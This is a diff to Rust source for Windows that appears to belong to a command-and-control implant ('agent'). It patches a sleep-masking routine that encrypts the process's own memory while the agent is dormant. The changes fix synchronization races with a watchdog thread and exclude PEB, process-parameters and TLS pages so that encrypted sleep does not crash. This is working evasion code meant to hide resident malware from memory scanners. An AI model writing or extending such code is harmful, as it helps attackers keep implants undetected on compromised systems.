@@ -64,6 +64,10 @@ const DORMANCY_BACKOFF_MS: u64 = 5;
 const DECRYPT_MAX_ATTEMPTS: usize = 30;
 const PAGE_SIZE: usize = 4096;
 const TLS_EXPANSION_SLOTS_OFFSET: usize = 0x1780;
+// Bounded exclusion span for the TLS expansion block (1024 slots x 8 bytes).
+const TLS_EXP_SPAN: usize = 8 * 1024;
+// Per-module TLS block pointer array (TEB+0x58): walk the inline slot count.
+const TLS_BLOCK_PTRS: usize = 64;
 // CONTEXT_CONTROL for x64: CONTEXT_CONTROL (0x1) ORed with the CONTEXT_AMD64
 // (0x0010_0000) selector bit. Using only 0x1 is the legacy x86 value and makes
 // GetThreadContext return an incomplete/zeroed control context on x64, so the
@@ -287,12 +291,13 @@ pub async fn engage_memguard_sleep(interval_secs: f64) -> bool {
         // than on the async worker before spawn) removes the startup race where
         // the watchdog could park on CMD_EVENT and enter dormancy before the
         // agent had written INTERVAL_BITS.
+        // Claim the submit sequence BEFORE signaling: the watchdog snapshots CMD_SEQ
+        // on wake, so publishing the command Event first would let it complete a
+        // cycle against a stale sequence. Acquire/Release here pairs with the
+        // watchdog's Acquire load of CMD_SEQ and its Release store of DONE_SEQ.
         INTERVAL_BITS.store(interval_secs.to_bits(), Ordering::Release);
+        let my_seq = CMD_SEQ.fetch_add(1, Ordering::AcqRel) + 1;
         let _ = unsafe { SetEvent(CMD_EVENT.load(Ordering::Acquire)) };
-        // Claim a monotonic submit sequence so the park loop can distinguish a
-        // genuine wake for THIS cycle from a latched WAKE left by a still-active
-        // previous cycle.
-        let my_seq = CMD_SEQ.fetch_add(1, Ordering::Release) + 1;
         let start = unsafe { GetTickCount64() };
         let park_ms = if interval_secs.is_finite() {
             (interval_secs * 1000.0) as u64
@@ -304,9 +309,10 @@ pub async fn engage_memguard_sleep(interval_secs: f64) -> bool {
         loop {
             let waited = unsafe { WaitForSingleObject(WAKE_EVENT.load(Ordering::Acquire), 1000) };
             if waited == 0 {
-                // A real wake for this cycle carries DONE_SEQ == my_seq; a latched
-                // wake from a prior cycle does not, so ignore it and keep waiting.
-                if DONE_SEQ.load(Ordering::Acquire) == my_seq {
+                // A real wake for this cycle carries DONE_SEQ >= my_seq; an auto-reset
+                // latch from a prior cycle can never reach my_seq, so the absolute
+                // comparison is immune to CMD-pulse coalescing.
+                if DONE_SEQ.load(Ordering::Acquire) >= my_seq {
                     woke = true;
                     break;
                 }
@@ -377,12 +383,20 @@ fn watchdog_main(ntdll: (usize, usize)) {
         unsafe {
             let _ = WaitForSingleObject(cmd, INFINITE);
         }
+        // Snapshot the submit sequence on every wake; the agent claims it (via
+        // fetch_add) just before pulsing CMD_EVENT, so this is the sequence for the
+        // cycle we are about to (re)run. Stored into DONE_SEQ before each wake
+        // pulse below so the agent's `DONE_SEQ >= my_seq` check is always met.
+        let seq = CMD_SEQ.load(Ordering::Acquire);
         let interval_secs = f64::from_bits(INTERVAL_BITS.load(Ordering::Acquire));
         let ntqit = match ntqit {
             Some(f) => f,
             None => {
                 plain_sleep(interval_secs);
                 let wake = WAKE_EVENT.load(Ordering::Acquire);
+                // Publish DONE_SEQ for THIS submit before pulsing the wake, even
+                // though we skipped the cycle (feature unavailable).
+                DONE_SEQ.store(seq, Ordering::Release);
                 if !wake.is_null() {
                     unsafe {
                         let _ = SetEvent(wake);
@@ -396,6 +410,7 @@ fn watchdog_main(ntdll: (usize, usize)) {
             None => {
                 plain_sleep(interval_secs);
                 let wake = WAKE_EVENT.load(Ordering::Acquire);
+                DONE_SEQ.store(seq, Ordering::Release);
                 if !wake.is_null() {
                     unsafe {
                         let _ = SetEvent(wake);
@@ -404,11 +419,20 @@ fn watchdog_main(ntdll: (usize, usize)) {
                 continue;
             }
         };
+        // Per-cycle retry: if initialization failed earlier (e.g. a transient
+        // thread exited between snapshot and OpenThread during the static-skip
+        // build), retry MemGuard::new() here so the feature self-enables instead of
+        // being permanently off. Cheap and only runs while disabled.
+        if guard.is_none() {
+            guard = MemGuard::new();
+        }
         let g = match guard.as_mut() {
             Some(g) => g,
             None => {
                 plain_sleep(interval_secs);
                 let wake = WAKE_EVENT.load(Ordering::Acquire);
+                // Publish DONE_SEQ for THIS submit before pulsing the wake.
+                DONE_SEQ.store(seq, Ordering::Release);
                 if !wake.is_null() {
                     unsafe {
                         let _ = SetEvent(wake);
@@ -451,11 +475,10 @@ fn watchdog_main(ntdll: (usize, usize)) {
                 ensure_decrypted(g);
             }
         }
-        // Mark this cycle complete (with the monotonic sequence) BEFORE pulsing
-        // the wake, so the agent's DONE_SEQ check can never observe the wake
-        // without the matching sequence (which would otherwise ignore a real
-        // wake and hang until the self-expire deadline).
-        DONE_SEQ.fetch_add(1, Ordering::Release);
+        // Mark this cycle complete (with the submit sequence we snapshotted on
+        // wake) BEFORE pulsing the wake, so the agent's DONE_SEQ >= my_seq check
+        // can never observe the wake without the matching sequence.
+        DONE_SEQ.store(seq, Ordering::Release);
         if !wake.is_null() {
             unsafe {
                 let _ = SetEvent(wake);
@@ -1005,6 +1028,10 @@ struct ThreadBasicInformation {
 /// exclude that thread's thread-local state, which is unsafe to encrypt around,
 /// so we fail closed (return `false`).
 fn add_thread_state_exclusions(guard: &mut MemGuard, slots: &[ThreadSlot]) -> bool {
+    // Process-global PEB/PP are identical for every thread; add them once per
+    // build, not once per thread (which would consume MAX_SKIP linearly).
+    let mut peb_done = false;
+    let mut pp_done = false;
     for s in slots {
         if s.teb.is_null() {
             return false;
@@ -1016,36 +1043,59 @@ fn add_thread_state_exclusions(guard: &mut MemGuard, slots: &[ThreadSlot]) -> bo
         unsafe {
             let peb = *(s.teb.add(0x60) as *const *mut c_void);
             if !peb.is_null() {
-                let peb_size = region_size_of(peb);
-                if peb_size > 0 && !guard.add_exclusion(peb as *const u8, peb_size) {
-                    return false;
+                if !peb_done {
+                    let peb_size = region_size_of(peb);
+                    if peb_size > 0 && !guard.add_exclusion(peb as *const u8, peb_size) {
+                        return false;
+                    } else {
+                        peb_done = true;
+                    }
                 }
                 // UNSAFE INVARIANT (narrow ProcessParameters exclusion): exclude only
                 // the pages the RTL_USER_PROCESS_PARAMETERS struct occupies (x64 ~0x490
                 // bytes from PEB+0x20), not its whole region (which holds the env
-                // block). See the watchdog exclusion above for the full rationale.
+                // block).
                 let pp = *(peb.add(0x20) as *const *mut c_void);
                 if !pp.is_null() {
-                    let pp_base = (pp as usize) & !(PAGE_SIZE - 1);
-                    let pp_end = (pp as usize) + 0x490;
-                    let pp_pages_end = (pp_end + PAGE_SIZE - 1) & !(PAGE_SIZE - 1);
-                    let pp_len = pp_pages_end - pp_base;
-                    if pp_len > 0 && !guard.add_exclusion(pp_base as *const u8, pp_len) {
-                        return false;
+                    if !pp_done {
+                        let pp_base = (pp as usize) & !(PAGE_SIZE - 1);
+                        let pp_end = (pp as usize) + 0x490;
+                        let pp_pages_end = (pp_end + PAGE_SIZE - 1) & !(PAGE_SIZE - 1);
+                        let pp_len = pp_pages_end - pp_base;
+                        if pp_len > 0 && !guard.add_exclusion(pp_base as *const u8, pp_len) {
+                            return false;
+                        } else {
+                            pp_done = true;
+                        }
                     }
                 }
             }
+            // TLS pointer table (TEB+0x58): table page(s) plus each pointed-to
+            // per-module TLS block page. Excluding only the table leaves the blocks
+            // encrypted, faulting on post-resume exception-dispatch TLS access.
             let tls = *(s.teb.add(0x58) as *const *mut c_void);
             if !tls.is_null() {
                 let page = (tls as usize & !(PAGE_SIZE - 1)) as *const u8;
                 if !guard.add_exclusion(page, PAGE_SIZE) {
                     return false;
                 }
+                for i in 0..TLS_BLOCK_PTRS {
+                    let slot = (tls as *const *mut c_void).add(i);
+                    let block = *slot;
+                    if !block.is_null() {
+                        let bpage = (block as usize & !(PAGE_SIZE - 1)) as *const u8;
+                        if !guard.add_exclusion(bpage, PAGE_SIZE) {
+                            return false;
+                        }
+                    }
+                }
             }
+            // TLS expansion block (TEB+0x1780): bounded 8 KiB span, not the whole
+            // VirtualQuery region (which would leak unrelated plaintext memory).
             let tls_exp = *(s.teb.add(TLS_EXPANSION_SLOTS_OFFSET) as *const *mut c_void);
             if !tls_exp.is_null() {
-                let tls_exp_size = region_size_of(tls_exp);
-                if tls_exp_size > 0 && !guard.add_exclusion(tls_exp as *const u8, tls_exp_size) {
+                let base = (tls_exp as usize & !(PAGE_SIZE - 1)) as *const u8;
+                if !guard.add_exclusion(base, TLS_EXP_SPAN) {
                     return false;
                 }
             }
@@ -1111,11 +1161,23 @@ fn add_watchdog_exclusions(guard: &mut MemGuard, ntqit: NtQueryInformationThread
             if !guard.add_exclusion(page, PAGE_SIZE) {
                 return false;
             }
+            // Walk the per-module TLS block pointer array (bounded) and exclude each
+            // pointed-to block's page.
+            for i in 0..TLS_BLOCK_PTRS {
+                let slot = (tls as *const *mut c_void).add(i);
+                let block = *slot;
+                if !block.is_null() {
+                    let bpage = (block as usize & !(PAGE_SIZE - 1)) as *const u8;
+                    if !guard.add_exclusion(bpage, PAGE_SIZE) {
+                        return false;
+                    }
+                }
+            }
         }
         let tls_exp = *(teb.add(TLS_EXPANSION_SLOTS_OFFSET) as *const *mut c_void);
         if !tls_exp.is_null() {
-            let tls_exp_size = region_size_of(tls_exp);
-            if tls_exp_size > 0 && !guard.add_exclusion(tls_exp as *const u8, tls_exp_size) {
+            let base = (tls_exp as usize & !(PAGE_SIZE - 1)) as *const u8;
+            if !guard.add_exclusion(base, TLS_EXP_SPAN) {
                 return false;
             }
         }
